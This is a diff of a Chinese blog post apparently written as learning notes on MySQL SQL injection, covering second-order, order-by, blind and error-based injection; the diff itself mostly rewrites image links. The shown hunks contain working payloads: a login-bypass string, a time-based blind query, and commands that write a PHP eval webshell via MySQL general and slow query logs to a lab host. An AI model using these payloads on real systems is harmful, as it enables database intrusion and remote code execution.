@@ -1,4 +1,4 @@
-<!DOCTYPE html><html lang="zh-cn"><head><meta name="generator" content="Hexo 3.9.0"><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=Edge"><meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no"><meta name="format-detection" content="telephone=no"><meta name="format-detection" content="email=no"><meta name="description"><meta name="keywords" content="Hexo, Gruntjs, Nodejs, Reactjs, Vuejs"><title>💉 SQLi_BYPASS_for_mysql Vol.1 - Naykcin's Page</title><link rel="stylesheet" href="/css/main_style.min.css"><link rel="icon" href="/logo.png"></head><body><input id="navi" type="checkbox"><ul class="main-navication"><li><a href="/"><span>Home</span></a></li><li><a href="https://github.com"><span>Github</span></a></li><li><a href="https://www.v2ex.com/"><span>V2EX</span></a></li></ul><div class="wrapper" id="wrap"><div class="post-header"><label class="navi-button light" for="navi">MENU</label><img class="background" src="http://47.95.140.43/typora_pic/background.JPG"><div class="post-title"><h1 class="title">💉 SQLi_BYPASS_for_mysql Vol.1</h1><ul class="meta"><li><i class="icon icon-author"></i>Naykcin</li><li><i class="icon icon-clock"></i>25 Minutes</li><li><i class="icon icon-calendar"></i>January 6, 2020</li></ul></div></div><div class="article-content" style="max-width:800px"><h2 id="💉-SQLi-BYPASS-for-mysql-Vol-1"><a href="#💉-SQLi-BYPASS-for-mysql-Vol-1" class="headerlink" title="💉 SQLi_BYPASS_for_mysql Vol.1"></a><center>💉 <em>SQLi_BYPASS_for_mysql Vol.1</em></center></h2><h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><ul>
+<!DOCTYPE html><html lang="zh-cn"><head><meta name="generator" content="Hexo 3.9.0"><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=Edge"><meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no"><meta name="format-detection" content="telephone=no"><meta name="format-detection" content="email=no"><meta name="description"><meta name="keywords" content="github"><title>💉 sqlibypass_for_mysql Vol.1 - Naykcin's Page</title><link rel="stylesheet" href="/css/main_style.min.css"><link rel="icon" href="/logo.png"></head><body><input id="navi" type="checkbox"><ul class="main-navication"><li><a href="/"><span>Home</span></a></li><li><a href="https://github.com/NickYan7"><span>Github</span></a></li></ul><div class="wrapper" id="wrap"><div class="post-header"><label class="navi-button light" for="navi">MENU</label><img class="background" src="/upload/background.JPG"><div class="post-title"><h1 class="title">💉 sqlibypass_for_mysql Vol.1</h1><ul class="meta"><li><i class="icon icon-author"></i>Naykcin</li><li><i class="icon icon-clock"></i>25 Minutes</li><li><i class="icon icon-calendar"></i>January 6, 2020</li></ul></div></div><div class="article-content" style="max-width:800px"><h2 id="💉-sqlibypass-for-mysql-Vol-1"><a href="#💉-sqlibypass-for-mysql-Vol-1" class="headerlink" title="💉 sqlibypass_for_mysql Vol.1"></a><center>💉 <em>sqlibypass_for_mysql Vol.1</em></center></h2><h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><ul>
 <li>基本语法</li>
 <li>二次注入</li>
 <li>宽字节注入</li>
@@ -26,7 +26,7 @@
 <p>可以用 16 进制编码来使 payload 不含单引号。二次注入多见于用户注册。</p>
 <p><strong>实例</strong></p>
 <p>在注册用户 <code>admin&#39;#</code> 时没有经过有效的转义，导致开发者认为该数据是安全的，进而导致可以绕过更改管理员的密码。</p>
-<p><img src="http://47.95.140.43/tu/SQLI_BYPASS/Screenshot%202020-02-13%20%E4%B8%8B%E5%8D%886.10.04.jpg" alt="Screenshot 2020-02-13 下午6.10.04"></p>
+<p><img src="//naykcin.top/2020/01/06/sqlibypass/Screenshot%202020-02-13%20%E4%B8%8B%E5%8D%886.10.04.jpg" alt="Screenshot 2020-02-13 下午6.10.04"></p>
 <p><strong>防御</strong></p>
 <ol>
 <li>不允许用户注册带有 <code>&#39;</code> 的名称。</li>
@@ -45,10 +45,10 @@
 <h3 id="0x03-order-by-注入"><a href="#0x03-order-by-注入" class="headerlink" title="0x03 order by 注入"></a>0x03 <em>order by</em> 注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from admin order by $id</span><br></pre></td></tr></table></figure>
 
 <p>order by 是用来判断列数的，其实就是按照第几列来进行排序的一个过程，如果超出列数则会报错。</p>
-<p><img src="http://47.95.140.43/tu/SQLI_BYPASS/Screenshot%202020-02-13%20%E4%B8%8B%E5%8D%886.10.04-1589352.jpg" alt="Screenshot 2020-02-13 下午6.10.04"></p>
+<p><img src="//naykcin.top/2020/01/06/sqlibypass/Screenshot%202020-02-13%20%E4%B8%8B%E5%8D%886.10.04-1589352.jpg" alt="Screenshot 2020-02-13 下午6.10.04"></p>
 <p>要注意 <code>order by</code> 注入是不能直接使用 <code>and 1=1</code> 来判断的，他需要用到条件语句。</p>
 <h3 id="0x04-盲注"><a href="#0x04-盲注" class="headerlink" title="0x04 盲注"></a>0x04 盲注</h3><h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p><strong>简单判断</strong></p>
-<p><img src="http://47.95.140.43/tu/SQLI_BYPASS/Screenshot%202020-02-13%20%E4%B8%8B%E5%8D%886.39.46.jpg" alt="Screenshot 2020-02-13 下午6.39.46"></p>
+<p><img src="//naykcin.top/2020/01/06/sqlibypass/Screenshot%202020-02-13%20%E4%B8%8B%E5%8D%886.39.46.jpg" alt="Screenshot 2020-02-13 下午6.39.46"></p>
 <p>这里利用到了 if 条件语句判断 <code>if(a,b,c)</code>，如果 a 为真则执行 b，否则执行 c。</p>
 <p>所以第一个命令以 password 列排序，第二个命令返回 false，无序。</p>
 <h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><p>时间盲注不能直接简单地 <code>sleep()</code>，因为目标会对每条内容来执行语句，会造成 DOS 测试获取速度慢等问题，这时候需要用到子查询。</p>
@@ -62,18 +62,18 @@
 <p>用法：</p>
 <ol>
 <li><p><code>substr(str,x,y)</code>，str 表示被截取的字符串，x 表示从第几位开始截取，y 表示截取几位。</p>
-<p><img src="http://47.95.140.43/tu/SQLI_BYPASS/Screenshot%202020-02-13%20%E4%B8%8B%E5%8D%886.58.56-1591646.jpg" alt="Screenshot 2020-02-13 下午6.58.56"></p>
+<p><img src="//naykcin.top/2020/01/06/sqlibypass/Screenshot%202020-02-13%20%E4%B8%8B%E5%8D%886.58.56-1591646.jpg" alt="Screenshot 2020-02-13 下午6.58.56"></p>
 </li>
 <li><p><code>substr(str,pos)</code>，str 表示被截取的字符串，pos 表示从某个位置开始截取到结尾所有字符串。(该语句不能用于 mssql)</p>
-<p><img src="http://47.95.140.43/tu/SQLI_BYPASS/Screenshot%202020-02-13%20%E4%B8%8B%E5%8D%887.01.18.jpg" alt="Screenshot 2020-02-13 下午7.01.18"></p>
+<p><img src="//naykcin.top/2020/01/06/sqlibypass/Screenshot%202020-02-13%20%E4%B8%8B%E5%8D%887.01.18.jpg" alt="Screenshot 2020-02-13 下午7.01.18"></p>
 </li>
 <li><p><code>concat(a,b,c)</code>，该函数使多个字符串连接成一个字符串。</p>
 <p><code>concat_ws(separator,a,b,c)</code>，第一个参数是分隔符。</p>
-<p><img src="http://47.95.140.43/tu/SQLI_BYPASS/Screenshot%202020-02-13%20%E4%B8%8B%E5%8D%888.24.24%201.jpg" alt="Screenshot 2020-02-13 下午8.24.24 1"></p>
+<p><img src="//naykcin.top/2020/01/06/sqlibypass/Screenshot%202020-02-13%20%E4%B8%8B%E5%8D%888.24.24%201.jpg" alt="Screenshot 2020-02-13 下午8.24.24 1"></p>
 </li>
 </ol>
 <p>这里用到了子查询，创造了条件判断，可以提高效率。</p>
-<p><img src="http://47.95.140.43/tu/SQLI_BYPASS/Screenshot%202020-02-13%20%E4%B8%8B%E5%8D%887.20.17.jpg" alt="Screenshot 2020-02-13 下午7.20.17"></p>
+<p><img src="//naykcin.top/2020/01/06/sqlibypass/Screenshot%202020-02-13%20%E4%B8%8B%E5%8D%887.20.17.jpg" alt="Screenshot 2020-02-13 下午7.20.17"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from admin order by if((substr((select user()),1,1)=&apos;r&apos;),(select 1 from (select sleep(2)) as b),password);</span><br></pre></td></tr></table></figure>
 
 <h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p>利用语法错误来注入，报错内容中含有错误的路径内容。</p>
@@ -86,14 +86,14 @@
 <p><code>select * from admin union select 1,user(),3;</code></p>
 <h3 id="0x06-limit"><a href="#0x06-limit" class="headerlink" title="0x06 limit"></a>0x06 <em>limit</em></h3><p><code>select * from admin limit 0,1;</code></p>
 <p>0 表示初始位置，1 表示偏移量。</p>
-<p><img src="http://47.95.140.43/tu/SQLI_BYPASS/Screenshot%202020-02-13%20%E4%B8%8B%E5%8D%889.11.25.jpg" alt="Screenshot 2020-02-13 下午9.11.25"></p>
+<p><img src="//naykcin.top/2020/01/06/sqlibypass/Screenshot%202020-02-13%20%E4%B8%8B%E5%8D%889.11.25.jpg" alt="Screenshot 2020-02-13 下午9.11.25"></p>
 <h3 id="0x07-offset"><a href="#0x07-offset" class="headerlink" title="0x07 offset"></a>0x07 <em>offset</em></h3><p><code>select * from admin limit 1 offset 0;</code></p>
 <p>用法和 limit 相似，但是位置正好相反。</p>
-<p><img src="http://47.95.140.43/tu/SQLI_BYPASS/Screenshot%202020-02-13%20%E4%B8%8B%E5%8D%889.13.51.jpg" alt="Screenshot 2020-02-13 下午9.13.51"></p>
+<p><img src="//naykcin.top/2020/01/06/sqlibypass/Screenshot%202020-02-13%20%E4%B8%8B%E5%8D%889.13.51.jpg" alt="Screenshot 2020-02-13 下午9.13.51"></p>
 <h3 id="0x08-万能密码"><a href="#0x08-万能密码" class="headerlink" title="0x08 万能密码"></a>0x08 万能密码</h3><p>万能密码的原理其实就是让条件恒成立，根据语句的形式来闭合。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from admin where username=&apos;&apos;or 1=1-- &apos; and password=&apos;123&apos;;</span><br></pre></td></tr></table></figure>
 
-<p><img src="http://47.95.140.43/tu/SQLI_BYPASS/Screenshot%202020-02-13%20%E4%B8%8B%E5%8D%889.19.03.jpg" alt="Screenshot 2020-02-13 下午9.19.03"></p>
+<p><img src="//naykcin.top/2020/01/06/sqlibypass/Screenshot%202020-02-13%20%E4%B8%8B%E5%8D%889.19.03.jpg" alt="Screenshot 2020-02-13 下午9.19.03"></p>
 <h3 id="0x09-读写文件"><a href="#0x09-读写文件" class="headerlink" title="0x09 读写文件"></a>0x09 读写文件</h3><p>mysql 5.6.34 版本以后 secure_file_priv 的值默认为 null，该值为 null 时我们无法导出文件。</p>
 <p>secure_file_priv 的默认值被修改为无才能利用，更改此设置必须修改配置文件，不能用 sql 语句。因此必须管理员修改好这个权限才可以。</p>
 <p>Windows 在 my.ini 的 [mysqld] 下面加上 <code>secure_file_priv =</code> 即可，Linux 在 <code>/etc/my.cnf</code> 中修改。</p>
@@ -131,19 +131,19 @@
 
 <p>还有一种慢日志，原理一样。</p>
 <p><code>show global variables like &#39;%query_log%&#39;;</code></p>
-<p><img src="http://47.95.140.43/tu/SQLI_BYPASS/Screenshot%202020-02-13%20%E4%B8%8B%E5%8D%8810.26.32.jpg" alt="Screenshot 2020-02-13 下午10.26.32"></p>
+<p><img src="//naykcin.top/2020/01/06/sqlibypass/Screenshot%202020-02-13%20%E4%B8%8B%E5%8D%8810.26.32.jpg" alt="Screenshot 2020-02-13 下午10.26.32"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set global slow_query_log=1;</span><br><span class="line">set global slow_query_log_file=&apos;D://404.php&apos;;</span><br><span class="line">select &apos;&lt;?php @eval($_POST[sb]);?&gt;&apos; or sleep(15);</span><br></pre></td></tr></table></figure>
 
 <h3 id="0x10-堆叠查询"><a href="#0x10-堆叠查询" class="headerlink" title="0x10 堆叠查询"></a>0x10 堆叠查询</h3><p>mysql 是支持堆叠查询的。用 ; 分割语句，但是 PHP 原生的连接方式不支持，但是使用 PDO、mysqli_multi_query() 等等是支持多语句的。</p>
 <p>在使用堆叠查询时基本是没有回显的，而且其实很难遇到这种环境。</p>
 <p><code>select * from admin where id=1;select user();</code></p>
-<p><img src="http://47.95.140.43/tu/SQLI_BYPASS/Screenshot%202020-02-13%20%E4%B8%8B%E5%8D%8810.33.10.jpg" alt="Screenshot 2020-02-13 下午10.33.10"></p>
+<p><img src="//naykcin.top/2020/01/06/sqlibypass/Screenshot%202020-02-13%20%E4%B8%8B%E5%8D%8810.33.10.jpg" alt="Screenshot 2020-02-13 下午10.33.10"></p>
 <p>如果对方支持堆叠查询，那么可以用日志来写 shell。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.59.129/Less-38/?id=1%27;set global general_log=on;set global general_log_file=&apos;C://phpstudy//404.php&apos;;--+</span><br><span class="line"></span><br><span class="line">http://192.168.59.129/Less-38/?id=1%27;select &apos;&lt;?php eval($_POST[404]) ?&gt;&apos;;--+</span><br></pre></td></tr></table></figure>
 
 <h3 id="0x11-表名解读"><a href="#0x11-表名解读" class="headerlink" title="0x11 表名解读"></a>0x11 表名解读</h3><h4 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a><em>information_schema</em></h4><p>这个库是在 <strong>mysql5.0</strong> 以后才有的。</p>
 <p>information_schema 是用于存储数据库元数据的库，它保存了数据库名、表名、列名等信息。</p>
-<p><img src="http://47.95.140.43/tu/SQLI_BYPASS/Screenshot%202020-02-13%20%E4%B8%8B%E5%8D%8810.41.44.jpg" alt="Screenshot 2020-02-13 下午10.41.44"></p>
+<p><img src="//naykcin.top/2020/01/06/sqlibypass/Screenshot%202020-02-13%20%E4%B8%8B%E5%8D%8810.41.44.jpg" alt="Screenshot 2020-02-13 下午10.41.44"></p>
 <p>常用到的几个表：</p>
 <ol>
 <li>schemata：提供了当前 mysql 实例中所有数据库的信息。</li>
@@ -151,21 +151,21 @@
 <li>columns：提供了表中的列信息。</li>
 </ol>
 <p><code>select * from information_schema.schemata;</code></p>
-<p><img src="http://47.95.140.43/tu/SQLI_BYPASS/Screenshot%202020-02-13%20%E4%B8%8B%E5%8D%8810.45.44.jpg" alt="Screenshot 2020-02-13 下午10.45.44"></p>
+<p><img src="//naykcin.top/2020/01/06/sqlibypass/Screenshot%202020-02-13%20%E4%B8%8B%E5%8D%8810.45.44.jpg" alt="Screenshot 2020-02-13 下午10.45.44"></p>
 <p><code>select table_name from information_schema.tables where table_schema=&#39;admin&#39;;</code></p>
-<p><img src="http://47.95.140.43/tu/SQLI_BYPASS/Screenshot%202020-02-13%20%E4%B8%8B%E5%8D%8810.52.18.jpg" alt="Screenshot 2020-02-13 下午10.52.18"></p>
+<p><img src="//naykcin.top/2020/01/06/sqlibypass/Screenshot%202020-02-13%20%E4%B8%8B%E5%8D%8810.52.18.jpg" alt="Screenshot 2020-02-13 下午10.52.18"></p>
 <p>这里要注意 <code>table_schema</code> 后跟的是数据库名称，可以用十六进制避免引号。</p>
 <p><code>select column_name from information_schema.columns where table_name=&#39;admin&#39;;</code></p>
-<p><img src="http://47.95.140.43/tu/SQLI_BYPASS/Screenshot%202020-02-13%20%E4%B8%8B%E5%8D%8810.57.32.jpg" alt="Screenshot 2020-02-13 下午10.57.32"></p>
+<p><img src="//naykcin.top/2020/01/06/sqlibypass/Screenshot%202020-02-13%20%E4%B8%8B%E5%8D%8810.57.32.jpg" alt="Screenshot 2020-02-13 下午10.57.32"></p>
 <p>⚠️ 注意：</p>
 <p>information_schema 存储的是所有数据库的信息，假如数据库 mysqltest1 和 mysqltest2 都有 admin 表的话，返回的将是：</p>
 <p><code>select column_name from information_schema.columns where table_name=&#39;admin&#39;;</code></p>
-<p><img src="http://47.95.140.43/tu/SQLI_BYPASS/Screenshot%202020-02-13%20%E4%B8%8B%E5%8D%8811.14.48.jpg" alt="Screenshot 2020-02-13 下午11.14.48"></p>
+<p><img src="//naykcin.top/2020/01/06/sqlibypass/Screenshot%202020-02-13%20%E4%B8%8B%E5%8D%8811.14.48.jpg" alt="Screenshot 2020-02-13 下午11.14.48"></p>
 <p>所以要指定库：</p>
 <p><code>select column_name from information_schema.columns where table_name=&#39;admin&#39; and table_schema=&#39;mysqltest2&#39;;</code></p>
-<p><img src="http://47.95.140.43/tu/SQLI_BYPASS/Screenshot%202020-02-13%20%E4%B8%8B%E5%8D%8811.19.54.jpg" alt="Screenshot 2020-02-13 下午11.19.54"></p>
+<p><img src="//naykcin.top/2020/01/06/sqlibypass/Screenshot%202020-02-13%20%E4%B8%8B%E5%8D%8811.19.54.jpg" alt="Screenshot 2020-02-13 下午11.19.54"></p>
 <h4 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a><em>mysql</em></h4><p>user 表保存用户的密码和 host 等信息。</p>
-<p><img src="http://47.95.140.43/tu/SQLI_BYPASS/Screenshot%202020-02-13%20%E4%B8%8B%E5%8D%8811.33.52.jpg" alt="Screenshot 2020-02-13 下午11.33.52"></p>
+<p><img src="//naykcin.top/2020/01/06/sqlibypass/Screenshot%202020-02-13%20%E4%B8%8B%E5%8D%8811.33.52.jpg" alt="Screenshot 2020-02-13 下午11.33.52"></p>
 <h3 id="0x12-符号"><a href="#0x12-符号" class="headerlink" title="0x12 符号"></a>0x12 符号</h3><p>常用到的特殊符号有：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;</span><br><span class="line">&quot;&quot;</span><br><span class="line">()</span><br><span class="line">&#123;&#125;</span><br><span class="line">\</span><br><span class="line">\\</span><br><span class="line">``</span><br><span class="line">%</span><br></pre></td></tr></table></figure>
 
@@ -191,16 +191,7 @@
 <li>情报收集是最重要的，可能它的源码就在 GitHub 上，或者在某个备份文件上。</li>
 </ol>
 <p><em>Hard work and no play makes Nick a dull boy.</em></p>
-</div><div class="article-meta" style="max-width:800px"></div><div class="article-comment" style="max-width:800px"><div class="ds-thread" id="ds-thread" data-thread-key="ckaigj8sn000puq90o8afxzzz" data-title="💉 SQLi_BYPASS_for_mysql Vol.1" data-url="https://naykcin.top/2020/01/06/sqlibypass/" site-name="ueibo"></div><script>var siteName = document.getElementById('ds-thread').getAttribute('site-name');
-var duoshuoQuery = {short_name: siteName};
-(function() {
-  var ds = document.createElement('script');
-  ds.type = 'text/javascript';ds.async = true;
-  ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
-  ds.charset = 'UTF-8';
-  (document.getElementsByTagName('head')[0] 
-  || document.getElementsByTagName('body')[0]).appendChild(ds);
-})();</script></div><ul class="navication"><li class="home"><a href="/"><i class="icon icon-home"></i></a></li><li><a href="/2020/01/07/sqlibypass2/"><i class="icon icon-arror-left"></i></a></li><li><a href="/2020/01/05/test1/"><i class="icon icon-arror-right"></i></a></li></ul><div class="page-footer"><div class="top"><ul class="social"><li><a href="https://github.com/NickYan7" title="Github" target="_blank"><i class="icon icon-github"></i></a></li><li><a href="http://47.95.140.43/tu/721580653348_.pic.jpg" title="wechat" target="_blank"><i class="icon icon-wechat"></i></a></li></ul></div><div class="bottom"><p class="copyright">© 2020 Naykcin's Page</p></div></div></div><script>var wrap = document.getElementById('wrap');
+</div><div class="article-meta" style="max-width:800px"></div><ul class="navication"><li class="home"><a href="/"><i class="icon icon-home"></i></a></li><li><a href="/2020/01/07/sqlibypass2/"><i class="icon icon-arror-left"></i></a></li><li><a href="/2020/01/05/test1/"><i class="icon icon-arror-right"></i></a></li></ul><div class="page-footer"><div class="top"><ul class="social"><li><a href="https://github.com/NickYan7" title="Github" target="_blank"><i class="icon icon-github"></i></a></li><li><a href="http://47.95.140.43/tu/721580653348_.pic.jpg" title="wechat" target="_blank"><i class="icon icon-wechat"></i></a></li></ul></div><div class="bottom"><p class="copyright">© 2020 Naykcin's Page</p></div></div></div><script>var wrap = document.getElementById('wrap');
 window.onload = function () {
   wrap.className += ' done';
 }</script></body></html>
